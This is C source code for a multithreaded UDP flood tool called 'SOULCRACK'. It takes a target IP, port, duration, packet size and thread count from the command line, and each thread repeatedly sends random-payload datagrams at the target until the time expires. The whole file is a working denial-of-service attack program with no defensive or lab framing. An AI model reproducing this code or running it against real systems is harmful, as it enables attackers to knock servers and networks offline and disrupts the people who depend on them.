#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;


void usage();
void *send_packets(void *arg);

void usage() {
    fprintf(stderr, "Usage: ./SOULCRACK [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n");
    exit(EXIT_FAILURE);
}

void *send_packets(void *arg) {
    int sockfd;
    struct sockaddr_in servaddr;
    char *packet_data;
    time_t start_time = time(NULL);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    

    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);

    packet_data = (char *)malloc(PACKET_SIZE);
    if (packet_data == NULL) {
        
        fprintf(stderr, "Memory allocation failed\n");
        close(sockfd);
        pthread_exit(NULL);
    }


    for (int i = 0; i < PACKET_SIZE; i++) {
        packet_data[i] = (char)(rand() % 256);
    }

    while (time(NULL) - start_time < DURATION_TIME) {
        if (sendto(sockfd, packet_data, PACKET_SIZE, 0, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
            perror("Send failed");

        }
    }

    free(packet_data);
    close(sockfd);
    
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {

    if (argc != 6) {
        usage();
    }


    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);


    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid argument values\n");
        usage();
    }


    printf("Sending packets to %s:%d for %d seconds with %d threads, each packet size %d bytes\n",
           TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT, PACKET_SIZE);

    pthread_t *threads;
    threads = (pthread_t *)malloc(THREAD_COUNT * sizeof(pthread_t));
    if (threads == NULL) {

        fprintf(stderr, "Memory allocation failed for thread IDs\n");
        return EXIT_FAILURE;
    }


    srand(time(NULL));


    int i;
    for (i = 0; i < THREAD_COUNT; i++) {

        if (pthread_create(&threads[i], NULL, send_packets, NULL) != 0) {
            perror("Thread creation failed");

            break;
        }
    }


    for (int j = 0; j < i; j++) {
        pthread_join(threads[j], NULL);
    }


    free(threads);
    puts("Packet sending finished.");

    return 0;
}
